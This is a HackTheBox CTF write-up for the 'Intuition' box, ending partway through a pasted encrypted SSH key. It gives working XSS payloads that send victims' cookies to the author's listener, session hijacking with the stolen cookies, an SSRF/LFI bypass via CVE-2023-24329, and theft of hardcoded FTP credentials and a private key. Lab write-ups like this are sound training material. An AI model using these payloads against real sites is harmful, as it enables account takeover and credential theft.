---
layout: post
title:  Intuition
description: Intuition is a Hard difficulity Linux box released during Season 5 Anomalies. Its...
date:   2024-08-07 17:47:47 -0500
image:  '/images/intuition04.jpg'
tags:   [HackTheBox, CTF, Season 5 Anomalies, Linux, Hard]
---

# Reconnaissance:

## <i class="fa-brands fa-rust fa-sm" style="color: #fb4934;"></i> RustScan:
{% highlight Markdown %}
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned ports so fast, even my computer was surprised.

Open 10.129.156.6:22
Open 10.129.156.6:80

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (128B)
{% endhighlight %}

## Ports:
<ul class="checklist">
<li><i class="fa-solid fa-frog" style="color: #b8bb26;"></i> 22 - SSH</li>
<li><i class="fa-solid fa-frog" style="color: #b8bb26;"></i> 80 - Webpage</li>
</ul>

## WhatWeb:
```
 whatweb 10.129.156.6
```

<img src="/images/box-images/Intuition/Intuition_WhatWeb.png">

* The domain appears to be `comprezzor.htb`.

## Fuzzing:
```
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://comprezzor.htb -H "Host: FUZZ.comprezzor.htb" -fs 178
```
#### Fuzzing Results
* **Subdomains:**

    <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> report.comprezzor.htb<br>
    <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> auth.comprezzor.htb<br>
    <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> dashboard.comprezzor.htb<br>

* **Directories:** *Nothing of importance on main domain*
    
    <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> **/login** on `auth.comprezzor.htb` subdomain<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> **/backup** and **/resolve** on `dashboard.comprezzor.htb` subdomain<br>

<img src="/images/box-images/Intuition/Intuition_Fuzzing.png" class="resize2">

## <i class="fa-solid fa-earth-americas" style="color: #076678;"></i> Website Discovery
* There's a report bug feature. Its about the only thing you can do on the main page.
	
    <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> Clicking report bug button takes you to another page where you can create an account to report a bug.

<img src="/images/box-images/Intuition/intuition_Report_Link.png">

<img src="/images/box-images/Intuition/intuition_Report_Bug_Button.png" class="resize">

* Register a new account and login with that account. You can now successfully report a bug.

<img src="/images/box-images/Intuition/Intutition_Report_Bug_Register_Account.png" class="resize">

<img src="/images/box-images/Intuition/Intuition_Registration.png" class="resize">

* Once registered lets go to `report a bug`. The report bug submission form is located at <mark>`http://report.comprezzor.htb/report_bug`</mark>.

<img src="/images/box-images/Intuition/Intuition_Report_Submissions_Form.png" class="resize">

* Lets test this form for any `XSS`.

## <i class="fa-solid fa-server" style="color: #b16286;"></i> XSS <i class="fa-solid fa-arrow-right-from-bracket" style="color: #b16286;"></i>

* Capture a request from the form and send it to your repeater.

<img src="/images/box-images/Intuition/Intuition_Report_Submissions_Request.png">

* We can see a cookie set in the request

<i class="fa-solid fa-cookie-bite fa-lg" style="color: #fabd2f;"></i> **Cookie:**
`user_data=eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogIkZyb2dnaWUiLCAicm9sZSI6ICJ1c2VyIn18OGY3YjI3OWQwZjk2MDEyMWFjMTc2M2Q0YzNiMjU2NTk4MGQzYzI3ODk5YmZlMzU3MjM4ZGMxYjY2ZTJhYzJiMg==`

* Lets setup a server and use a `XSS` payload to see if we can steal any cookies from the server.


<i class="fa-solid fa-cookie-bite fa-lg" style="color: #fabd2f;"></i> **Cookie Theft:**
* Using a simple payload to see if we can request any cookies from the server.<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> `<script>var i=new Image(); i.src="http://10.10.14.200:34000/?cookie="+btoa(document.cookie);</script>`

<img src="/images/box-images/Intuition/Intuition_Cookie_Theft_Payload.png">

* Setup a python server to listen for the reply to come from the server.<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> `python3 -m http.server 34000`

* After waiting for the server to process the request we actually get a hit on the cookies.

```
10.129.156.6 - - [06/Sep/2024 06:51:50] "GET /?cookie=dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNaXdnSW5WelpYSnVZVzFsSWpvZ0ltRmtZVzBpTENBaWNtOXNaU0k2SUNKM1pXSmtaWFlpZlh3MU9HWTJaamN5TlRNek9XTmxNMlkyT1dRNE5UVXlZVEV3TmprMlpHUmxZbUkyT0dJeVlqVTNaREpsTlRJell6QTRZbVJsT0RZNFpETmhOelUyWkdJNA== HTTP/1.1" 200
```

<img src="/images/box-images/Intuition/Intuition_Cookies.png">

* The cookie is encypted with base64. Lets decrypt it so we can pass it through our browser cache and see if we can login using the cookie.

```
echo 'dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNaXdnSW5WelpYSnVZVzFsSWpvZ0ltRmtZVzBpTENBaWNtOXNaU0k2SUNKM1pXSmtaWFlpZlh3MU9HWTJaamN5TlRNek9XTmxNMlkyT1dRNE5UVXlZVEV3TmprMlpHUmxZbUkyT0dJeVlqVTNaREpsTlRJell6QTRZbVJsT0RZNFpETmhOelUyWkdJNA==' | base64 -d
```

<i class="fa-solid fa-cookie-bite fa-lg" style="color: #fabd2f;"></i> `user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4`

<img src="/images/box-images/Intuition/Intuition_Cookie_Theft_Decrypt.png">

## <i class="fa-solid fa-cookie fa-xlg" style="color: #fabd2f;"></i>  Cookie Login:
* Lets head over to the login page: `http://auth.comprezzor.htb/login`.<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> Open your browser console and navigate to the `storage` tab.

<img src="/images/box-images/Intuition/Intuition_Browser_Storage_Cookie.png">

* We want to replace the current cookie with the one we stole with the `XSS` attack.<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> Delete the current cookie then using the `Key : Value ` pair lets insert our cookie.
    * Key: `user_data`
    * Value: `eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4`

* After inserting simply refresh the webpage with an `F5` or hitting the reload button.

<i class="fa-solid fa-triangle-exclamation fa-xl" style="color: #fb4934;"></i> <b>NOTICE:</b> You may have issues here. If you have issues with it triggering correctly please set your cookie to this.\
	* Name: `user_data`
	* Value: `eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4`
	* Domain: `.comprezzor.htb`
	* Path: `/`
* Then manually travel to <mark>`http://dashboard.comprezzor.htb`</mark>. Setting it to this covers the whole domain. Im not sure why it doesn't redirect sometimes but this should work also.

* We land on a dashboard page as user `webdev`:

<img src="/images/box-images/Intuition/Intuition_Dashboard_Webdev.png">

* Once logged in you can see the bug reports being generated. 

## <i class="fa-regular fa-newspaper" style="color: #fb4934;"></i> Report Generation:
* We need to submit a report and see if it shows up here using <mark>`http://report.comprezzor.htb`</mark>. Open a second tab and submit a report.<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> If you send a report with the `webdev` cookie still in your browser you will get a ticket from `adam`. This will not work, you will need to capture a request or use the same request you had for capturing the cookie that uses your `new user account` to submit the ticket.

<img src="/images/box-images/Intuition/Intuition_Report_Bug_Submission_Dashboard.png">

* Using the same burp request we used earlier to capture the cookie send it again to see your ticket appear in the queue.

<img src="/images/box-images/Intuition/Intuition_Froggie_Ticket.png">


* We submit a report and notice we have low priority set as a default.
* Reading the instructions found on the website we can see that higher priority will be resolved by the `admin`. So if we can escalate the priority of our ticket maybe we can capture the `admin` cookie in the same manner as before.

<i class="fa-solid fa-triangle-exclamation fa-xl" style="color: #fb4934;"></i> <b>NOTICE:</b> I had to disable `dark reader` it was messing up the UI and I couldn't see my ticket. So if you have a dark mode enabled you may want to disable it.<br>
    <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> Also, there is a script to remove tickets and set it back to a default state. So you need to be relatively quick in your exploiting or your ticket will disappear.

<img src="/images/box-images/Intuition/Intuition_Froggie_Ticket_Priority.png">

## <i class="fa-solid fa-cookie fa-xlg" style="color: #fabd2f;"></i> Admin Cookies:
* Make sure your `XSS payload` is in the `Report Title` of the ticket. So the admin reads it when it gets sent over.

<img src="/images/box-images/Intuition/Intuition_Admin_Cookie_Theft_Priority_Report_Title.png">

* I actually had to change my payload. The one i was using wasn't allowing the `set high priority` to show up in the ticket. Such odd behavior.<br>
	<i class="fa-solid fa-explosion" style="color: #aec07c;"></i> Use this payload `<img src=x onerror="fetch("http://10.10.14.200"34000/)">`. Put this as your `ReportTitle` but leave the earlier cookie payload in the description.<br>
	<i class="fa-solid fa-explosion" style="color: #aec07c;"></i> If you're  not getting the admin cookie reset your box. Sometimes it gets broke from to many tickets being sent. 

* Your request should look like this.

```
POST /report_bug HTTP/1.1
Host: report.comprezzor.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://report.comprezzor.htb/report_bug
Content-Type: application/x-www-form-urlencoded
Content-Length: 207
Origin: http://report.comprezzor.htb
DNT: 1
Connection: close
Cookie: user_data=eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogIkZyb2dnaWUiLCAicm9sZSI6ICJ1c2VyIn18OGY3YjI3OWQwZjk2MDEyMWFjMTc2M2Q0YzNiMjU2NTk4MGQzYzI3ODk5YmZlMzU3MjM4ZGMxYjY2ZTJhYzJiMg==
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

report_title=<img+src%3dx+onerror%3d"fetch("http%3a//10.10.14.200"34000/)">&description=<script>var+i%3dnew+Image()%3b+i.src%3d"http%3a//10.10.14.200%3a34000/%3fcookie%3d"%2bbtoa(document.cookie)%3b</script>


```

* Set the priority to high and you should get the `admin cookie`.

```
10.129.30.32 - - [06/Sep/2024 08:51:34] "GET /?cookie=dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNU3dnSW5WelpYSnVZVzFsSWpvZ0ltRmtiV2x1SWl3Z0luSnZiR1VpT2lBaVlXUnRhVzRpZlh3ek5EZ3lNak16TTJRME5EUmhaVEJsTkRBeU1tWTJZMk0yTnpsaFl6bGtNalprTVdReFpEWTRNbU0xT1dNMk1XTm1ZbVZoTWpsa056YzJaRFU0T1dRNQ== HTTP/1.1" 200 -
```

* In the screenshot you will receive the cookie for `webdev` again because we have the server waiting, but once you change to high priority you should get the second response with the `admin cookie`.

<img src="/images/box-images/Intuition/Intuition_Admin_Cookie_Theft_Cookie.png">

* Doing the same thing as before, decrypt and store the cookies into the browser.

```
echo 'dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNU3dnSW5WelpYSnVZVzFsSWpvZ0ltRmtiV2x1SWl3Z0luSnZiR1VpT2lBaVlXUnRhVzRpZlh3ek5EZ3lNak16TTJRME5EUmhaVEJsTkRBeU1tWTJZMk0yTnpsaFl6bGtNalprTVdReFpEWTRNbU0xT1dNMk1XTm1ZbVZoTWpsa056YzJaRFU0T1dRNQ==' | base64 -d

```

<i class="fa-solid fa-cookie-bite fa-lg" style="color: #fabd2f;"></i> Admin Cookie: `user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5`

<img src="/images/box-images/Intuition/Intuition_Admin_Dashboard.png">

# <i class="fa-solid fa-feather-pointed" style="color: #aec07c;"></i> Recon:
### <i class="fa-solid fa-file-pdf fa-xs" style="color: #fb4934;"></i> PDF Generator:
Once in the admin dashboard you have a link to `Create PDF Report`. 

<img src="/images/box-images/Intuition/Intuition_Admin_Create_PDF_Report.png">

* You can `Make a PDF Report`. Lets just see what gets sent to a `NC Listener` and if anything responds.

<img src="/images/box-images/Intuition/Intuition_Create_PDF_URL_NC.png">

* We get an `unexpected error!` On the PDF report..BUT! On our `NC listener` we get some interesting information.

```
listening on [any] 34000 ...
connect to [10.10.14.200] from (UNKNOWN) [10.129.30.32] 41434
GET / HTTP/1.1
Accept-Encoding: identity
Host: 10.10.14.200:34000
User-Agent: Python-urllib/3.11
Cookie: user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
Connection: close

```

<img src="/images/box-images/Intuition/Intuition_NC_PDF_Hit.png">

* We see the agent is using `Python-urlib/3.11`. We can use this to look for vulnerabilities and CVE's related to this tool.

## <i class="fa-solid fa-user-secret" style="color: #fb4934"></i> CVE-2023-24329:
* We find a CVE Related to this version of `urlib 3.11`.<br>
    <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-24329">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-24329</a>
* The CVE essentially works by allowing users to bypass blocklists with simply  injecting a blank space before the url in our request. This can allow use to perform different types of attacks like LFI, SSRF and even command execution because we are bypassing any filters put into place on the domain.

* Capture a request from the `Create PDF` tool we just used to get the previous information.

<img src="/images/box-images/Intuition/Intuition_Create_PDF_Request.png">

* Next lets change the `report_Url=PAYLOAD` input to try some simple `LFI`.

<img src="/images/box-images/Intuition/Intuition_PDF_LFI.png">

* Open the `response` in your browser, if using burp just right click and "Open in browser", and we will see the PDF was generated with the `LFI` included.

<img src="/images/box-images/Intuition/Intution_PDF_LFI_Proof.png">

## <i class="fa-brands fa-python" style="color: #98971a;"></i> Python App:
* We know the system is running python more than likely this is a flask app lets see if we can check a generic flask app location and get any information.<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> change your `LFI` to <mark> ` file:///app/code/app.py`</mark>. Don't forget the empty space before `file`. That's the whole exploit.

<img src="/images/box-images/Intuition/Intuition_Python_App_LFI.png">

* We find a stored `secret key` inside the code of the app.<br>
	<i class="fa-solid fa-seedling fa-lg" style="color: #98971a"></i>  `app.secret_key = "7ASS7ADA8RF3FD7"` but im not sure its useful at the moment.
* We can also see all the `IMPORTS` the app is making. We can go check these out and see if we can find anymore information thats being pulled into the app via other imports.

* Running the code through `chatgpt` to make it more human readable we get:

{%highlight python%}
from flask import Flask, request, redirect
from blueprints.index.index import main_bp
from blueprints.report.report import report_bp
from blueprints.auth.auth import auth_bp
from blueprints.dashboard.dashboard import dashboard_bp

app = Flask(__name__)

# Set the secret key for session management
app.secret_key = "7ASS7ADA8RF3FD7"

# Configure server settings
app.config['SERVER_NAME'] = 'comprezzor.htb'
app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024  # Limit file size to 5MB

# Define allowed file extensions
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'docx'}  # Add more allowed file extensions if needed

# Register blueprints for different parts of the application
app.register_blueprint(main_bp)
app.register_blueprint(report_bp, subdomain='report')
app.register_blueprint(auth_bp, subdomain='auth')
app.register_blueprint(dashboard_bp, subdomain='dashboard')

if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0", port=80)
{%endhighlight%}

* We can explore these `Imports` with our `LFI`.<br>
	 <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> <mark>` file:///app/code/blueprints/report/report.py`</mark><br>
    * Since its python we are assuming its a `.py` script at the end of the import.

<img src="/images/box-images/Intuition/Intuition_Report_PY_LFI.png">

* We find the `report.py` script. Running it through `chatgpt` again for readability.

{%highlight python%}
from flask import Blueprint, render_template, request, flash, url_for, redirect
from .report_utils import *
from blueprints.auth.auth_utils import deserialize_user_data, admin_required, login_required

# Define the Blueprint for the report routes
report_bp = Blueprint("report", __name__, subdomain="report")

# Route for the report index page
@report_bp.route("/", methods=["GET"])
def report_index():
    return render_template("report/index.html")

# Route for reporting a bug
@report_bp.route("/report_bug", methods=["GET", "POST"])
@login_required
def report_bug():
    if request.method == "POST":
        user_data = request.cookies.get("user_data")
        user_info = deserialize_user_data(user_data)
        name = user_info["username"]
        report_title = request.form["report_title"]
        description = request.form["description"]

        if add_report(name, report_title, description):
            flash(
                "Bug report submitted successfully! Our team will be checking on this shortly.",
                "success"
            )
        else:
            flash("Error occurred while trying to add the report!", "error")
        
        return redirect(url_for("report.report_bug"))
    
    return render_template("report/report_bug_form.html")

# Route for listing all reports (admin only)
@report_bp.route("/list_reports")
@login_required
@admin_required
def list_reports():
    reports = get_all_reports()
    return render_template("report/report_list.html", reports=reports)

# Route for viewing details of a specific report (admin only)
@report_bp.route("/report/<int:report_id>")
@login_required
@admin_required
def report_details(report_id):
    report = get_report_by_id(report_id)
    
    if report:
        return render_template("report/report_details.html", report=report)
    else:
        flash("Report not found!", "error")
        return redirect(url_for("report.report_index"))

# Route for the about reports page
@report_bp.route("/about_reports", methods=["GET"])
def about_reports():
    return render_template("report/about_reports.html")
{%endhighlight%}

* Theres nothing to interesting here, just some `routes` and logic.

* Lets check <mark>`file:///app/code/blueprints/dashboard/dashboard.py`</mark>

<img src="/images/box-images/Intuition/Intuition_Dashboard_PY_LFI.png">

* Again run through `chatgpt` for readability.

{%highlight python%}
from flask import Blueprint, request, render_template, flash, redirect, url_for, send_file
from blueprints.auth.auth_utils import admin_required, login_required, deserialize_user_data
from blueprints.report.report_utils import (
    get_report_by_priority, get_report_by_id, delete_report,
    get_all_reports, change_report_priority, resolve_report
)
import random
import os
import pdfkit
import socket
import urllib.request
from urllib.parse import urlparse
import zipfile
from ftplib import FTP
from datetime import datetime

# Define the Blueprint for the dashboard routes
dashboard_bp = Blueprint('dashboard', __name__, subdomain='dashboard')

# Path to save PDF reports
pdf_report_path = os.path.join(os.path.dirname(__file__), 'pdf_reports')

# Allowed hostnames for PDF report creation
allowed_hostnames = ['report.comprezzor.htb']

@dashboard_bp.route('/', methods=['GET'])
@admin_required
def dashboard():
    """Render the dashboard based on user role."""
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)

    if user_info['role'] == 'admin':
        reports = get_report_by_priority(1)
    elif user_info['role'] == 'webdev':
        reports = get_all_reports()

    return render_template('dashboard/dashboard.html', reports=reports, user_info=user_info)

@dashboard_bp.route('/report/', methods=['GET'])
@login_required
def get_report(report_id):
    """Render a specific report if the user is authorized."""
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)

    if user_info['role'] in ['admin', 'webdev']:
        report = get_report_by_id(report_id)
        return render_template('dashboard/report.html', report=report, user_info=user_info)
    
    # If not authorized, do nothing (or handle unauthorized access)
    return redirect(url_for('dashboard.dashboard'))

@dashboard_bp.route('/delete/', methods=['GET'])
@login_required
def del_report(report_id):
    """Delete a report if the user is authorized and redirect to dashboard."""
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)

    if user_info['role'] in ['admin', 'webdev']:
        delete_report(report_id)
        return redirect(url_for('dashboard.dashboard'))
    
    # If not authorized, do nothing (or handle unauthorized access)
    return redirect(url_for('dashboard.dashboard'))

@dashboard_bp.route('/resolve', methods=['POST'])
@login_required
def resolve():
    """Resolve a report and provide feedback to the user."""
    report_id = int(request.args.get('report_id'))

    if resolve_report(report_id):
        flash('Report resolved successfully!', 'success')
    else:
        flash('Error occurred while trying to resolve!', 'error')

    return redirect(url_for('dashboard.dashboard'))

@dashboard_bp.route('/change_priority', methods=['POST'])
@admin_required
def change_priority():
    """Change the priority of a report if the user is an admin."""
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)

    if user_info['role'] != 'admin':
        flash('Not enough permissions. Only admins can change report priority.', 'error')
        return redirect(url_for('dashboard.dashboard'))

    report_id = int(request.args.get('report_id'))
    priority_level = int(request.args.get('priority_level'))

    if change_report_priority(report_id, priority_level):
        flash('Report priority level changed!', 'success')
    else:
        flash('Error occurred while trying to change the priority!', 'error')

    return redirect(url_for('dashboard.dashboard'))

@dashboard_bp.route('/create_pdf_report', methods=['GET', 'POST'])
@admin_required
def create_pdf_report():
    """Create a PDF report from a URL and provide it for download."""
    if request.method == 'POST':
        report_url = request.form.get('report_url')

        try:
            scheme = urlparse(report_url).scheme
            hostname = urlparse(report_url).netloc

            disallowed_schemas = ["file", "ftp", "ftps"]
            if (scheme not in disallowed_schemas) and (
                (socket.gethostbyname(hostname.split(":")[0]) != '127.0.0.1') or
                (hostname in allowed_hostnames)
            ):
                # Fetch the report content
                request_url = urllib.request.Request(report_url, headers={'Cookie': 'user_data=...'})
                response = urllib.request.urlopen(request_url)
                html_content = response.read().decode('utf-8')

                # Generate the PDF
                pdf_filename = f'{pdf_report_path}/report_{random.randint(10000, 90000)}.pdf'
                pdfkit.from_string(html_content, pdf_filename)
                return send_file(pdf_filename, as_attachment=True)
            else:
                flash('Invalid URL', 'error')

        except Exception as e:
            flash('Unexpected error!', 'error')
        
        return render_template('dashboard/create_pdf_report.html')

    return render_template('dashboard/create_pdf_report.html')

@dashboard_bp.route('/backup', methods=['GET'])
@admin_required
def backup():
    """Create a backup of the application and upload it to an FTP server."""
    source_directory = os.path.abspath(os.path.dirname(__file__) + '../../../')
    current_datetime = datetime.now().strftime("%Y%m%d%H%M%S")
    backup_filename = f'app_backup_{current_datetime}.zip'

    # Create a ZIP backup
    with zipfile.ZipFile(backup_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(source_directory):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, source_directory)
                zipf.write(file_path, arcname=arcname)

    try:
        # Upload backup to FTP server
        ftp = FTP('ftp.local')
        ftp.login(user='ftp_admin', passwd='u3jai8y71s2')
        ftp.cwd('/')
        with open(backup_filename, 'rb') as file:
            ftp.storbinary(f'STOR {backup_filename}', file)
        ftp.quit()
        os.remove(backup_filename)
        flash('Backup and upload completed successfully!', 'success')
    except Exception as e:
        flash(f'Error: {str(e)}', 'error')
    
    return redirect(url_for('dashboard.dashboard'))
{%endhighlight%}

## FTP Backup:
* In the `dashboard.py` script there appears to be a `FTP backup` method put into place that is backing up the application.<br>
	<i class="fa-solid fa-explosion" style="color: #aec07c;"></i> They stored the login directly in the app.<br>
	<i class="fa-solid fa-frog" style="color: #b8bb26;"></i> user: `ftp_admin`<br>
	<i class="fa-solid fa-seedling fa-lg" style="color: #98971a"></i> password: `u3jai8y71s2`

* We can abuse our `CVE` vulnerability and use `SSRF` to try to connect to the FTP server locally and receive the information back in the PDF.

* Set your Exploit in your request to <mark>`ftp://ftp_admin:u3jai8y71s2@ftp.local`</mark>. This will connect locally and the response will be sent back in the pdf.

<img src="/images/box-images/Intuition/Intuition_FTP_Connect.png">

* Awesome. It worked. We see that housed in the ftp server is a couple of interesting files.

```
-rw------- 1 root root  2,655 Sep 06 14:50 private-8297.key
-rw-r--r-- 1 root root 15,519 Sep 06 14:50 welcome_note.pdf
-rw-r--r-- 1 root root  1,732 Sep 06 14:50 welcome_note.txt

```

* You guessed what happens next! Lets try to access these files.
* `ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key`
* `ftp://ftp_admin:u3jai8y71s2@ftp.local/welcome_note.pdf`
* `ftp://ftp_admin:u3jai8y71s2@ftp.local/welcome_note.txt`

* Welcome Text:<br>

<blockquote>
Dear Devs,

We are thrilled to extend a warm welcome to you as you embark on this exciting journey with us. Your arrival marks the beginning of an inspiring chapter in our collective pursuit of excellence, and we are genuinely delighted to have you on board.

Here, we value talent, innovation, and teamwork, and your presence here reaffirms our commitment to nurturing a diverse and dynamic workforce. Your skills, experience, and unique perspectives are invaluable assets that will contribute significantly to our continued growth and success.

As you settle into your new role, please know that you have our unwavering support. Our team is here to guide and assist you every step of the way, ensuring that you have the resources and knowledge necessary to thrive in your position.

To facilitate your work and access to our systems, we have attached an SSH private key to this email. You can use the following passphrase to access it: `Y27SH19HDIWD`. Please ensure the utmost confidentiality and security when using this key.

If you have any questions or require assistance with server access or any other aspect of your work, please do not hesitate to reach out. In addition to your technical skills, we encourage you to bring your passion, creativity, and innovative thinking to the table. Your contributions will play a vital role in shaping the future of our projects and products.

Once again, welcome to your new family. We look forward to getting to know you, collaborating with you, and witnessing your exceptional contributions. Together, we will continue to achieve great things.

If you have any questions or need further information, please feel free to contact me at adam@comprezzor.htb.

Best regards,

Adam
</blockquote><br>

* The welcome text contained a access password to go along with the `SSH Private Key`.<br>
	<i class="fa-solid fa-seedling" style="color: #98971a;"></i> `Y27SH19HDIWD`

* Encrypted Private Key:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDyIVwjHg
cDQsuL69cF7BJpAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDfUe6nu6ud
KETqHA3v4sOjhIA4sxSwJOpWJsS//l6KBOcHRD6qJiFZeyQ5NkHiEKPIEfsHuFMzykx8lA
KK79WWvR0BV6ZwHSQnRQByD9eAj60Z/CZNcq19PHr6uaTRjHqQ/zbs7pzWTs+mdCwKLOU7
x+X0XGGmtrPH4/YODxuOwP9S7luu0XmG0m7sh8I1ETISobycDN/2qa1E/w0VBNuBltR1BR
BdDiGObtiZ1sG+cMsCSGwCB0sYO/3aa5Us10N2v3999T7u7YTwJuf9Vq5Yxt8VqDT/t+JX
U0LuE5xPpzedBJ5BNGNwAPqkEBmjNnQsYlBleco6FN4La7Irn74fb/7OFGR/iHuLc3UFQk
TlK7LNXegrKxxb1fLp2g4B1yPr2eVDX/OzbqAE789NAv1Ag7O5H1IHTH2BTPTF3Fsm7pk+
efwRuTusue6fZteAipv4rZAPKETMLeBPbUGoxPNvRy6VLfTLV+CzYGJTdrnNHWYQ7+sqbc
JFGDBQ+X3QelEAAAWQ+YGB02Ep/88YxudrpfK8MjnpV50/Ew4KtvEjqe4oNL4zLr4qpRec
80EVZXE2y8k7+2Kqe9+i65RDTpTv+D88M4p/x0wOSVoquD3NNKDSDCmuo0+EU+5WrZcLGT
ybB8rzzM+RZTm2/XqXvrPPKqtZ9jGIVWhzOirVmbr7lU9reyyotru1RrFDrKSZB4Rju/6V
YMLzlQ0hG+558YqQ/VU1wrcViqMCAHoKo+kxYBhvA7Pq1XDtU1vLJRhQikg249Iu4NnPtA
bS5NY4W5E0myaT6sj1Nb7GMlU9aId+PQLxwfPzHvmZArlZBl2EdwOrH4K6Acl/WX2Gchia
R9Rb3vhhJ9fAP10cmKCGNRXUHgAw3LS/xXbskoaamN/Vj9CHqF1ciEswr0STURBgN4OUO7
cEH6cOmv7/blKgJUM/9/lzQ0VSCoBiFkje9BEQ5UFgZod+Lw5UVW5JrkHrO4NHZmJR7epT
9e+7RTOJW1rKq6xf4WmTbEMV95TKAu1BIfSPJgLAO25+RF4fGJj+A3fnIB0aDmFmT4qiiz
YyJUQumFsZDRxaFCWSsGaTIdZSPzXm1lB0fu3fI1gaJ+73Aat9Z4+BrwxOrQeoSjj6nAJa
lPmLlsKmOE+50l+kB2OBuqssg0kQHgPmiI+TMBAW71WU9ce5Qpg7udDVPrbkFPiEn7nBxO
JJEKO4U29k93NK1FJNDJ8VI3qqqDy6GMziNapOlNTsWqRf5mCSWpbJu70LE32Ng5IqFGCu
r4y/3AuPTgzCQUt78p0NbaHTB8eyOpRwoGvKUQ10XWaFO5IVWlZ3O5Q1JB1vPkxod6YOAk
wsOvp4pZK/FPi165tghhogsjbKMrkTS1+RVLhhDIraNnpay2VLMOq8U4pcVYbg0Mm0+Qeh
FYsktA4nHEX5EmURXO2WZgQThZrvfsEK5EIPKFMM7BSiprnoapMMFzKAwAh1D8rJlDsgG/
Lnw6FPnlUHoSZU4yi8oIras0zYHOQjiPToRMBQQPLcyBUpZwUv/aW8I0BuQv2bbfq5X6QW
1VjanxEJQau8dOczeWfG55R9TrF+ZU3G27UZVt4mZtbwoQipK71hmKDraWEyqp+cLmvIRu
eIIIcWPliMi9t+c3mI897sv45XWUkBfv6kNmfs1l9BH/GRrD+JYlNFzpW1PpdbnzjNHHZ3
NL4dUe3Dt5rGyQF8xpBm3m8H/0bt4AslcUL9RsyXvBK26BIdkqoZHKNyV9xlnIktlVELaZ
